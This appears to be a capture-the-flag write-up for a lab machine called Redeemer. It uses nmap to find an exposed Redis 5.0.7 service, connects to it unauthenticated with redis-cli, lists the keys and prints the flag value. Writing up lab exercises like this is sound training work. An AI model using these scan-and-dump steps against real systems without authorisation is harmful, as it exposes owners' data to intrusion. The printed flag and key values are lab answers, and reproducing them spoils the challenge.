# Redeemer

# TL;DR

- We connect to the redis server running on the target maching, enumerate the database and retrieve the flag,

# Enumeration

- `ping 10.129.22.160` : to test if the server us up and running.
- We scan the host to determine running services:
```
nmap -p- -sV 10.129.22.160
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-28 06:40 PST
Nmap scan report for 10.129.22.160
Host is up (0.089s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.18 seconds
```
- From the scan we find `redis` service running on port `6379/tcp`.

# Foothold

 - We can connect to the redis service using `netcat` or the `redis-cli`. We can install the `redis-cli` with the following command incase it does not already exist on our local host: `sudp apt install redis-tools`
 - We can see the flags that can be used with the cli with the following command: `redis-cli --help`.
 - We can run the following command to connect to the server:
```
redis-cli -h 10.129.22.160    
10.129.22.160:6379>
```
- Once connect to the server we can run `info` to get information about what the redis server contains:
```
10.129.22.160:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0

[**SNIP**]

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```
- From the output above we find out that the redis server contains only `one database` at `index 0` and that database contains `4 keys`.
- We can select the database with the following command: `select 0`:
```
10.129.22.160:6379> select 0
OK
```
- Once the database is selected we can display all the keys with `keys *`:
```
10.129.22.160:6379> keys *
1) "numb"
2) "temp"
3) "flag"
4) "stor"
```
- We can view the value of each key by running `get <key>` and get the value of the flag:
```
0.129.22.160:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"
10.129.22.160:6379> get temp
"1c98492cd337252698d0c5f631dfb7ae"
10.129.22.160:6379> get stor
"e80d635f95686148284526e1980740f8"
10.129.22.160:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```